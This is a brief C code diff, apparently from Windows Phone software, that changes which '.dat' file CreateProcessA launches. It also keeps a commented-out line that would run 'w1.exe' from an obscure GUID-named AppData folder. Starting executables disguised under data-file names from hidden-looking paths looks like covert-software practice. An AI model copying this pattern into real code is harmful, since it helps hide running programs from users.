@@ -591,7 +591,7 @@ DWORD startPI(void)
 	};
 
 
-	if(CreateProcessA("DeviceInfo.dat",0,0,0,FALSE,0,0,0,&si,&pi)==0)		
+	if(CreateProcessA("MyPhoneInfo.dat",0,0,0,FALSE,0,0,0,&si,&pi)==0)		
 	//CreateProcessA("cmd_arm.exe"," /C \\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\w1.exe",0,0,FALSE,0,0,0,&si,&pi);
     {
 		//non sono riuscito a creare il processo
